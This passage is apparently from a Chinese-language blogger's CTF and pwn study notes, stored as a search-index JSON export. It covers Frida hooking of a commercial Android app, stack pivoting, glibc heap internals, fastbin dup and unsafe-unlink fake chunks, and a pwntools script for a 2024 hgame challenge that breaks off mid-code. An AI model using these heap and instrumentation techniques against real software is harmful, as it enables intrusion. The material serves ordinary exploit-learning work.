\"]},\"16\":{\"h\":\"frida的反调试\",\"t\":[\"这里学习到的 我们调试一个程序的时候 我们首先要获取它的包名提前声明这里实战 只是为了学习 学习经验()\"]},\"17\":{\"h\":\"实战\"},\"18\":{\"h\":\"获取包名\",\"t\":[\"这里看教程大概就是 去找到AndroidMainfest.xml文件 然后搜索package=xxxx这个xxxx就是包的名字 \",\"这里我们拿到包名字:com.netease.x19\"]},\"19\":{\"h\":\"hook 一个测试脚本\",\"t\":[\"function main() { Java.enumerateLoadedClasses({ onMatch: function(name, handler) { if(name.indexOf(\\\"com.netease.x19\\\") != -1) { console.log(name); var clz = Java.use(name); var methods = clz.class.getDeclaredMethods(); for(var i = 0; i < methods.length; i++) { console.log(\\\"name:\\\", name, \\\"methods:\\\", methods[i]); } } }, onComplete: function() { } }); } setImmediate( function(){ console.log(\\\"test\\\") Java.perform(main); } ) \",\"然后\",\"我们执行指令\",\"frida -U -f com.netease.x19 -l hook.js --no-pause \",\"然后发生报错:\",\"usage: frida [options] target frida: error: unrecognized arguments: --no-pause \",\"这里搜了去 发现frida在新版本中移除了--no-pause 所以我们就不带这个了\",\"执行完上面的hook指令后发现了报错\",\"Failed to spawn: need Gadget to attach on jailed Android; its default location is: C:\\\\Users\\\\61428\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\frida\\\\gadget-android-arm64.so \",\"然后搜索发现是我修改了默认的端口号为11451 所以我带上参数:-H 127.0.0.1:11451\",\"frida -H 127.0.0.1:11451 -f com.netease.x19 -l hook.js \",\"执行成功\",\" ____ / _ | Frida 16.1.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to 127.0.0.1:11451 (id=socket@127.0.0.1:11451) Spawned `com.netease.x19`. Resuming main thread! [Remote::com.netease.x19 ]-> \",\"然后我们得到了一堆数据 太多了 这里放不下 接下来我们需要筛选(留着后天来写)\"]},\"20\":{\"h\":\"objection 初次体验\"},\"21\":{\"h\":\"连接\",\"t\":[\"第一次我使用的教程上面说的:objection -g <应用标识符> explore但是报错:\",\"Unable to connect to the frida server: need Gadget to attach on jailed Android; its default location is:..... \",\"我猜测大概是因为我们frida修改了端口号 所以我们尝试objection -g com.netease.x19 explore -P 11451\"]},\"22\":{\"h\":\"8byte（简单栈迁移）\"},\"23\":{\"h\":\"栈迁移\",\"t\":[\"这里好好学一下栈迁移这个知识点 确实重要 因为已经遇到了很多次了\"]},\"24\":{\"h\":\"栈迁移的大致操作\",\"t\":[\"通过将ebp覆盖成构造的fake_ebp ，再利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。\",\"这里写个小插曲 因为大多数时候我都是去ida直接找的这个gadget 但是好像可以用命令行来解决这个问题比如我们这里用指令\",\"$ ROPgadget --binary pwn --only \\\"leave|ret\\\" \"]},\"25\":{\"h\":\"栈迁移核心\",\"t\":[\"因为我们常使用leave_ret gadget链来实现\",\" leave指令\",\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址 这样就可以实现栈的移动\",\"这里说一下我自己的浅薄理解 因为我们使用的栈其实本质就是基于rbp/rsp定位的 所以我们只需要把寄存器的值改变就实现了栈迁移 新的fake 地址后面的内容会被当成栈\",\"那么这个指令的本质:\",\"mov esp,ebp; pop ebp; \",\"ret 指令\",\"pop eip \",\"那么下面是实现原理图\",\"原理\",\"这里是执行mov esp ,ebp;这个操作之前的栈结构 我们在ebp这个位置放入我们我们希望这个栈最终落脚点 然后就会执行\",\"​ \",\"这里就是pop ebp;这个操作 因为 pop操作我们的rsp向下移动一格 ebp寄存器 存入fake_ebp1_addr\",\"然后执行指令ret--> pop eip; 这个指令 那么同理 rsp向下移动一格 eip存入我们的read_plt\",\"这里需要注意eip这个寄存器很特殊 这个寄存器是存入的我们下一条执行的指令地址 所以当执行完ret后整个程序流程就跑到了read_plt这里\",\"那么 到现在我们就可以理清楚了核心需要实现的部分:\",\"将rbp寄存器改值 ---- >栈迁移\",\"将rip寄存器改值 ------ >劫持程序流程\",\"换句话说 我们只要能够实现这两个部分就可以了\",\"接下来我们需要理解 栈的指针寄存器:rsp 还任然留在了原地 以及最容易理解错的是 当我们执行read函数的时候 程序会自动保存下一个指令的地址 这是函数的调用约定所以当我们执行完后read函数后 我们来到了leave_ret指令的地方\",\"此时我们rsp = rbp 那么我们的rsp也成功完成了迁移工作 来到了 fake_ebp的地方\",\"然后 把fake_ebp2的地址给了rbp rsp向下跑一下\",\"原理3\",\"所以这里我们是需要构造第二个fake_ebp的\",\"然后我们就成功完成了一次栈迁移\"]},\"26\":{\"h\":\"c2018-HitCon-gundam(tcahe机制+泄露libc地址)\"},\"27\":{\"h\":\"重要知识点\",\"t\":[\"由于linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中。而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。\"]},\"28\":{\"h\":\"tcahe机制\",\"t\":[\"学习文章:glibc Tcache机制-CSDN博客\",\"一共有64个bins\",\"Tcache缓存的是非Large Chunk的chunk。\",\"首先是tcahe是单链表结构,每条链上最多可以有7个chunk\",\"free后 当对应的tcahe bin放满了 才会放入fastbin,unsorted bin\",\"malloc的时候优先去tcahe中找\"]},\"29\":{\"h\":\"机制\",\"t\":[\"代码:\",\"这里tcache_perthread_struct 首先\",\"counts代表着每个bin当前所有的chunk数量\",\"tcache_entry代表着当前bin的首个chunk\",\"由于是单链形式 所以结构体属性就是下一个chunk的指针\",\"typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \\\"tcache_perthread_struct\\\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; \",\"结构图\",\"机制\"]},\"30\":{\"h\":\"利用tcache泄露地址\",\"t\":[\"tcache位于heap最前端 也属于一个堆块\",\"用vmmap指令查找heap最开始的位置\",\"用x/26gx 指令来查看对应地址 堆结构 （x/26gx 0x55e22cd98000+0x10）\",\"heap\",\"也就是最后一个加入tcache的chunk\",\"我们通过连续申请8个gundam,让第八个gundam出现在unsorted bin里面 那么我们如何找到它呢?\",\"我们这里知道了第七个地址 那么第八个的地址:x/26gx 0x000055e22cd98a10+0x30+0x110-0x10\",\"一个gundam包含两个chunk,大小为0x30,另一个为0x110\",\"那么输入指令后我们找到了这个chunk\",\"unsorted_bins\",\"我们可以发现这个地方fd和bk都指向了 同一个地址 也就是main_arena+88(unsortedbin头结点)\",\"然后我们就得到了main_arena的地址\",\"再去查找libc的基地址 vmmap得到的:\",\"计算:\",\"0x7f566befac78-libc基地址0x7f566bb4f000=偏移0x3ac78\",\"这里我们就得到了偏移 这样在远程服务器的时候就可以利用这个偏移获取libc基地址\"]},\"31\":{\"h\":\"写一个计算chunk大小的程序\",\"t\":[\"由于做题的时候老是脑子不够用 无法根据malloc(num)中的num获取chunk的size 所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\"]},\"32\":{\"h\":\"原理\",\"t\":[\"最小chunk为0x20\",\"chunk一定是size_sz *2 的倍数(内存对齐)\",\"chunk可以占用下一个chunk的prev_size来存东西\",\"所以我们就是看是否malloc的大小 +size所占字节数 然后是否内存对齐 如果没有则加到对齐 然后 判断最后的size是否小于0x20 如果小于则直接等于0x20\",\"所以直接使用公式:(num + 8 +0xf)&~0xf; 其中num就是我们malloc传的参数\"]},\"33\":{\"h\":\"脚本\",\"t\":[\"#include <stdio.h> #include<stdlib.h> int main() { while (1) { int num = 0; int size = 0; int num2 = 0; printf(\\\"malloc:\\\"); scanf(\\\"%x\\\",&num); size = (num + 8 +0xf)&~0xf; if (size < 0x20) { size = 0x20; } if (size -16 < num) { printf(\\\"will take up prev_size of the next chunk\\\\n\\\"); } printf(\\\"0x%x\\\",size); fflush(stdin); printf(\\\"\\\\n\\\"); /* code */ } return 0; } \"]},\"34\":{\"h\":\"ezChunk(unlink+offbynull)\"},\"35\":{\"h\":\"分析一下题\",\"t\":[\"进入 addemo函数内部 查找关键结构体\",\"st数据看起来是关键\",\"(_DWORD *)&st_next12 + 10 * i 这个是存size的\",\"(_QWORD *)&st + 5 * i这个是emo content的内容\",\"(char *)&st + 40 * i + 20是存name的\",\"*((_DWORD *)&st_next8 + 10 * i)存使用情况\",\"我们这里开始简单运算一下 这个数组到底是怎么存放数据的 指针为char类型\",\"存size: point + 40 *i +12 存 int类型\",\"存content :point + 40 *i 存一个结构体指针\",\"存name: point + 40*i +20\",\"存使用情况:point +40*i +8 存一个int\",\"所以每个元素:\",\"type emo struct { Content *string // 0-8 IsUsed int // 8-12 Size int // 12-16 index int // 16-20 Name string[16] //20-36 } \"]},\"36\":{\"h\":\"chunk分析\",\"t\":[\"在addemo的时候name malloc(0x10) 马上free了 但是没有清空\",\"emo content的时候malloc(size)\",\"在delemo的时候是根据emo.isused来判断是否存在的\",\"emo.content被清空 并且被清空\",\"emo.isused被设置为0\",\"editemo的时候是根据判断emo.content是否为空去编辑的\",\"直接向emo.content中写入内容\",\"printemo是根据emo.content是否为空去判断的\",\"然后直接打印出来\"]},\"37\":{\"h\":\"漏洞学习\",\"t\":[\"这题存在off_by_null漏洞\",\"构造heap overlap 触发unlink漏洞\"]},\"38\":{\"h\":\"先学习unlink漏洞\",\"t\":[\"学习文章:一道题彻底理解 Pwn Heap Unlink-腾讯云开发者社区-腾讯云 (tencent.com)\",\"明确一下对象双向链表\",\"宏定义\",\"#define unlink(AV, P, BK, FD) \",\"P： 待脱链的空闲chunk的指针\",\"BK：后一个chunk的指针\",\"FD：前一个chunk的指针\"]},\"39\":{\"h\":\"流程\",\"t\":[\"大小检查\",\"if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); \",\"检查下一个chunk的prev_size是否与p的大小相同\",\"获取fd与bk\",\"通过p的fd/bk去获取前面一个chunk的fd和后面一个chunk的bk\",\"检查\",\"if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); \",\"这里很关键因为会检查前后chunk中 fd或者bk 指向的是否是p chunk\",\"这里等效为:\",\"P->fd->bk == P <=> *(P->fd + 0x18) == P p->bk->fd == P <=> *(p->bk + 0x10) == P \",\"那么就很明确了\",\"将p->fd置为 (&p-0x18)\",\"将p->bk设置为 (&p-0x10)\",\"脱链\",\"FD->bk = BK 与BK->fd = FD\",\"FD->bk = BK <=> P->fd->bk = p->bk <=> *(P->fd + 0x18) = P->bk //Ⅰ BK->fd = FD <=> P->bk->fd = p->fd <=> *(P->bk + 0x10) = P->fd //Ⅱ \",\"等效为: P->fd->bk = p->bk与 P->bk->fd = p->fd\",\"这里相当于让前后的chunk连接起来了 把中间的chunk忽略掉\"]},\"40\":{\"h\":\"调试技巧\",\"t\":[\"heap可以查看当前的chunk\"]},\"41\":{\"h\":\"学习路线:\",\"t\":[\"学习路线\",\"​\"]},\"42\":{\"h\":\"ret2dl\"},\"43\":{\"h\":\"部分前置知识讲解\"},\"44\":{\"h\":\"got表和plt表详细解说\",\"t\":[\"这里我们不对plt和got表内详细内容进行介绍了 需要了解的参考这个文章:深入窥探动态链接 - 知乎 (zhihu.com)我们主要探讨在第一次数据绑定的时候 我们程序究竟是怎么运行的 我们假设我们的函数在plt[1]的地方\",\"运行PLT[1]\",\"由于我是是第一次的调用 所以GOT[3]的内容为:PLT[1]中push reloc_arg;指令的地址 也就是会执行push reloc_arg 和jmp plt[0]自动跳转PLT[0]去完成绑定 并且 将reloc_arg参数作为参数这里PLT[N]与GOT[2+N]一 一对应\",\"jmp [GOT[3]]; push reloc_arg; jmp PLT[0]; \",\"运行PLT[0]\",\"这里相当于_dl_runtime_resolve(link_map,reloc_arg)\",\"push [GOT[1]]; // 1存的就是link_map jmp [GOT[2]]; // 2存的是_dl_runtime_resolve函数 \",\"_dl_runtime_resolve函数\",\"这里写了一个大概的源码 方便我们了解 大概就是调用_dl_fixup然后这个函数将真实的地址返回给rax寄存器 最后我们jmp过去 实现函数调用\",\"# _dl_runtime_resolve 示例 - x86_64 汇编 # # 注意：这是一个简化的示例，用于说明目的。 # 实际实现会根据系统的动态链接器的具体需求和优化而有所不同。 .global _dl_runtime_resolve .type _dl_runtime_resolve, @function _dl_runtime_resolve: # 保存寄存器，因为这些寄存器会在 _dl_fixup 中被使用 pushq %rax # 保存原始的返回地址 pushq %rcx # 保存第一个参数 pushq %rdx # 保存第二个参数 # 传递 _dl_runtime_resolve 的参数给 _dl_fixup # 第一个参数（通常是符号索引）在 %rdi 中 # 第二个参数（返回地址）现在在栈顶 movq (%rsp), %rsi # 将返回地址移动到 %rsi # 调用 _dl_fixup 来解析符号地址 # _dl_fixup(符号索引, 返回地址) call _dl_fixup # _dl_fixup 返回解析后的函数地址在 %rax 中 # 恢复寄存器 popq %rdx # 恢复第二个参数 popq %rcx # 恢复第一个参数 popq %rax # 恢复原始的返回地址 # 使用解析后的地址跳转执行目标函数 # 这里我们假设解析后的地址已经由 _dl_fixup 放入 %rax 中 jmp *%rax # _dl_fixup 函数的伪声明，需要实际实现 .type _dl_fixup, @function _dl_fixup: # 实际的 _dl_fixup 实现会在这里 ret \"]},\"45\":{\"h\":\"_dl_runtime_resolve部分详细解说\",\"t\":[\"参考文章:深入理解-dl_runtime_resolve - unr4v31 - 博客园 (cnblogs.com)\",\"_dl_runtime_resolve(link_map_obj, reloc_index) \"]},\"46\":{\"h\":\"reloc_index\",\"t\":[\"省略点将 我们可以通过reloc_index知道我们要绑定函数的名字 其获取逻辑是:\",\"elf_rel = rel_plt[reloc_index]; r_info = elf_rel.r_info; elf_sym = *(r_info); st_name = elf.sym.st_name; // 这里的function_name就是我们需要的函数名了 function_name = dynstr[st_name]; \",\"这个参数 可以粗俗得当作一个属于.rel.plt这个数组的下标 就像是: .rel.plt[reloc_index]\",\"type ELF_Rel struct { r_offset int64 r_info int } rel.plt = []Elf_Rel{} \",\"r_offset: 存储 我们需要修改的plt条目的位置 相当于是告诉我们PLT[N]中的这个N 但是其实这里r_offset是一个绝对地址 相当于:&PLT[N]\",\"r_info高位3字节 用来表示 .dynsym这个数组的下标 也就是.dynsym[r_info]\",\"然后.dynsym[r_info].st_name获取我们需要的函数名字在.dynstr数组中的下标 然后我们就可以通过.dynstr[st_name]来获取名字了\",\"所以总结一下:\",\".dynstr存函数名字\",\".dynsym存函数名字在.dynstr中的位置\",\".rel_plt存我们需要.dynsym中哪个结构体 方便我们取出名字\"]},\"47\":{\"h\":\"深入学习堆结构\",\"t\":[\"做hgame的时候 有点做不动heap的题 所以来学习一下基本功学习文章:【pwn】学pwn日记（堆结构学习）（随缘更新）_pwn 堆特性-CSDN博客\"]},\"48\":{\"h\":\"堆管理器\",\"t\":[\"在linux中 堆管理器 由libc.so.6链接库实现\",\"brk\",\"mmap\",\"brk函数\",\"申请小的内存空间 从heap下方的data段 向上申请内存\",\"mmap函数\",\"一般申请较大的内存空间 从shared libraries里面开新的空间\",\"子线程只能用mmap函数\"]},\"49\":{\"h\":\"流程\",\"t\":[\"用户使用malloc函数向堆管理器申请一块内存空间\",\"堆管理器用brk或者mmap函数去获取内存\"]},\"50\":{\"h\":\"chunk结构\",\"t\":[\"完整的chunk 一般是prev_size ,size(含AMP),fd, bk, fd,_nextsize,bk,_nextsize这几个组成\",\"需要注意的是 prev_size有且仅当 上一个chunk处于free状态的时候来表示 上一个chunk的大小否则 就作为上一个chunk的一部分来存数据\",\"chunk_struct\",\"alloced chunk 由于是使用状态所以 在使用的就只有prev_size 和size两个部分\",\"alloced_chunk\",\"free chunk常见的就是携带fd 和bk 然后当p为0的时候 两个chunk会合并为一个较大的chunk\",\"fast bin的chunk\",\"保留最基本结构 最简单的结构 也就是 prev_size+size+fd+data 所以 fastbin最小结构为0x20 也就是4* 0x8(64位)\",\"top chunk 也就是一个超大的chunk 用户申请内存的时候 会先搜索bins 然后再搜索top chunk实在不够才会去调用brk函数申请空间 然后再从top chunk中申请\"]},\"51\":{\"h\":\"申请内存的过程\",\"t\":[\"这里原文章讲特别好 我直接copy了(虽然之前也是copy)\",\"申请内存<64bytes 则从tcachebin(tcachebin 从glibc2.26引入),fast bins或者smallbin找\",\"申请内存 >64bytes 则从unsorted bin找\",\"unsorted bin无和是bin则遍历unsorted bin合并free chunk 然后找 如果有合适的就直接给 否则将合并后的放入对应bin\",\"去large bin找\",\"向top chunk中找\",\"brk函数申请 然后从top chunk中找\",\"mmap函数 申请 然后从top chunk中找\",\"当我们申请0xn0和0xn8内存大小的时候 系统其实给我们的是一样的chunk大小 因为我们可以利用下一面一个chunk的prev_size的空间 刚好0x8的空间(64位)\"]},\"52\":{\"h\":\"NTUSTISC - Pwn 2学习笔记\",\"t\":[\"查看glibc的源码网址:https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c\"]},\"53\":{\"h\":\"TSL 了解\"},\"54\":{\"h\":\"gdb 如何查 fs？\",\"t\":[\"print (void)arch_prctl(option_num,addr) \",\"option_num 是决定是我们的操作 比如0x1003就是取fs的值\",\"addr就是取fs放在什么地方\",\"pwngdb的话直接输入tls也可以查到\"]},\"55\":{\"h\":\"bin\"},\"56\":{\"h\":\"free 源码分析\",\"t\":[\"运行_int_free函数\",\"如果size小于get_max_fast()就进入fastbin\",\"通过fastbin_index(size)获取对应大小的fastbin\",\"fastbin(av,idx)获取fastbin的位置\",\"然后chunk入链\"]},\"57\":{\"h\":\"malloc源码分析\",\"t\":[\"运行_int_malloc函数\",\"先获取我们真正需要的 chunk 大小\",\"判断是否是fastbin范围\",\"获取对应大小的fastbin然后获取位置\",\"然后 chunk出链\"]},\"58\":{\"h\":\"Fastbin\",\"t\":[\"fd指向下一个free chunk的chunk head(也就是下一个free的chunk)\",\"不去修改p\"]},\"59\":{\"h\":\"Tcache\",\"t\":[\"从libc2.26开始引入\",\"从0x20到0x410\",\"每个tcache最多收取7个chunk\",\"用结构tcache_perthread_struct管理tcache\",\"存在于TLS\",\"一共两个部分 一个是对应大小的tcache bin的链表(每个最多存7个chunk) 一个是对应链表的元素数量\",\"chunk的bk是一串随机的安全数 防止double free的\",\"fd指向的是 下一个free chunk的mem(也就是payload的部分)\"]},\"60\":{\"h\":\"Fastbin dup\",\"t\":[\"算是一个正式的攻击手段\",\"利用double free让整个链表陷入循环\",\"比如现在fastBin->chunk1->chunk2 然后此时chunk1的fd指向chunk2然后我们再次free chunk2那么chunk2的fd指向chunk1就会变成:fastBin->chunk2->chunk1->chunk2->chunk1的死循环\",\"然后我们malloc一下 获取了chunk2然后此时链表:fastbin->chunk1->chunk2->chunk1...\",\"然后我们修改chunk2fd指向我们想要修改的地方 那么链表:fastbin->chunk1->chunk2->addr_we_want\",\"那么我们malloc三次获取我们想要的地址的读写权\",\"记住是我们想要写入地址-0x10 因为还有prev_size+size\",\"然后根据源码 我们可以知道\",\"size检查\",\"我们的size得>=2*SIZE_SZ然后必须<=av->system_mem\",\" if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); mutex_lock(&av->mutex); locked = 1; chunk_at_offset (p, size)->size <= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) >= av->system_mem; })) { errstr = \\\"free(): invalid next size (fast)\\\"; goto errout; } if (! have_lock) { (void)mutex_unlock(&av->mutex); locked = 0; } } \",\"检查double chunk\",\"仅仅是检查bin中第一个chunk是否是相同的chunk\",\"free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \\\"double free or corruption (fasttop)\\\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock && old != NULL) old_idx = fastbin_index(chunksize(old)); p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0)) { errstr = \\\"invalid fastbin entry (free)\\\"; goto errout; } \"]},\"61\":{\"h\":\"Tcache利用\",\"t\":[\"大多数性质和fastbin是一样的 但是calloc是不会拿tcache的 所以我们一般把tcache填满来绕过\"]},\"62\":{\"h\":\"NTUSTISC-PWN3阅读笔记（1）\",\"t\":[\"主要是看NTUSTISC\"]},\"63\":{\"h\":\"tcache dup\",\"t\":[\"tcache在libc2.31里面引用了key检查 然后在malloc的时候没有检查size 其次tcache的fd指向的是chunk data\",\"会在free进入tcache后在bk位置写入随机数 用于检查\",\"当检查一样时候 会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",\"如果一样提示double free\",\"size_t tc_idx = csize2tidx (size); if (tcache != NULL && tc_idx < mp_.tcache_bins) { /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^<size_t> chance), so verify it's not an unlikely coincidence before aborting. */ // 这里就是检查bk是否等于tcache if (__glibc_unlikely (e->key == tcache)) { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) if (tmp == e) malloc_printerr (\\\"free(): double free detected in tcache 2\\\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ } if (tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (p, tc_idx); return; } } \"]},\"64\":{\"h\":\"UnsortedBin\",\"t\":[\"被free的chunk的上一块chunk是free chunk就合并\",\"如果下一块chunk是top chunk则合并到top chunk里面\",\"首个是main_arena然后双向链表\"]},\"65\":{\"h\":\"Consolidate\",\"t\":[\"unsortedBin在合并的时候 会使用unlink_chunk进行一个拖链操作\",\"首先获取p的size然后去找到下一个chunk 看下一个chunk的prev_size是否等于这个size\",\"通过p的fd获取上一个chunk bk获取下一个chunk\",\"FD = p->fd\",\"BK = p->bk\",\"然后FD->bk和BK->fd是否等于p\",\"然后BK->bk等于FD andFd->fd等于BK\",\"这样就完成了脱链操作\",\"static void unlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL) { if (p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p) malloc_printerr (\\\"corrupted double-linked list (not small)\\\"); if (fd->fd_nextsize == NULL) { if (p->fd_nextsize == p) fd->fd_nextsize = fd->bk_nextsize = fd; else { fd->fd_nextsize = p->fd_nextsize; fd->bk_nextsize = p->bk_nextsize; p->fd_nextsize->bk_nextsize = fd; p->bk_nextsize->fd_nextsize = fd; } } else { p->fd_nextsize->bk_nextsize = p->bk_nextsize; p->bk_nextsize->fd_nextsize = p->fd_nextsize; } } } \"]},\"66\":{\"h\":\"UnsafeUnlink + off_by_one\",\"t\":[\"这里主要是绕过unlink 来实现一个fake chunk的利用 主要运用在\",\"fakeUnlink\",\"当我们可以多写一个字节的时候我们可以构造一个fake chunk\",\"prev_size 0即可\",\"size payload的长度+1\",\"fd和bk\",\"这两个就比较重要了 因为要绕过unlink的安全检查 也就是检查FD->bk == p == BK->fd and p->size = nextchunk(p)->prev_size\",\"所以我们可以构造fd为ptr-0x18 那么FD->bk也就是FD+0X18的位置为p 绕过检查\",\"bk 同理设计为ptr-0x10\",\"next_chunk_prev_size 也就是下一个chunk的prev_size 这个构造等于payload的长度\",\"然后多的一个字节为0的话 我们就相当于chunk的p为0也就是我们构造的fake chunk会被当做free chunk而且这个free chunk的起始位置是根据prev_size来定的\",\"然后那么根据源码最终ptr会指向fd也就是ptr-0x18的位置\",\"这里的fd->bk和bk->fd都是p\",\" if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; \"]},\"67\":{\"h\":\"记一次失败的UnsoretedBin 泄露libc（2024hgameWeek3 [1]）\",\"t\":[\"什么都pwn只会害了你\",\"2024 hgame的week3的一道题 libc版本2.27 虽然这个思路失败了 但是觉得还是学了东西 就记录下来\"]},\"68\":{\"h\":\"题目\",\"t\":[\"main函数\",\"​ \",\"add函数\",\"add\",\"delete函数\",\"delete\",\"show函数\",\"show\"]},\"69\":{\"h\":\"原理\",\"t\":[\"首先libc版本为2.27 引入了tcache并且没有引入bk随机数安全检查机制\",\"tcache bin的范围为:0x20-0x420\",\"tcache bin单个区间大小的链表长度最长为7个\",\"然后根据add函数的逻辑 我们一次性只能new一个0xff大小的chunk 显然不足以超过tcache bin的大小 所以我们得先填充满tcache\",\"unsorted bin是一个双向链表\",\"unsorted bin中第一个chunk的bk和最后一个chunk的fd都指向main_arena+48（32位）或main_arena+88（64位）的位置\",\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main_arena+88的位置\",\"我们先把unsorted bin大小的chunk申请下来 然后再free 让fd和bk填充进去 然后malloc要回来\"]},\"70\":{\"h\":\"实践\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) for i in range(8): print(\\\"i :\\\",i) add(i, 0xa0, b\\\"\\\\x00\\\") r.interactive() \",\"先malloc 10个chunk(大于8个就行)\",\"因为如果unsorted bin的chunk和top chunk相邻会被直接合并 所以我们需要一个alloced chunk挡在top chunk前\",\"然后free 8个chunk 让tcache bin的位置填满 然后malloc 8个 让tcache bin先被消耗掉\",\"因为当tcache chunk有大小合适的 chunk的时候 优先取 tcache chunk然后再去寻找unsorted bin\",\"然后我发现一个状况 就是新获得unsroted bin中的chunk fd和bk都被清空了\",\"empty\",\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合 这个unsortedbin的chunk的大小就会被清空\",\"所以尝试其他思路\"]},\"71\":{\"h\":\"修改思路\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = 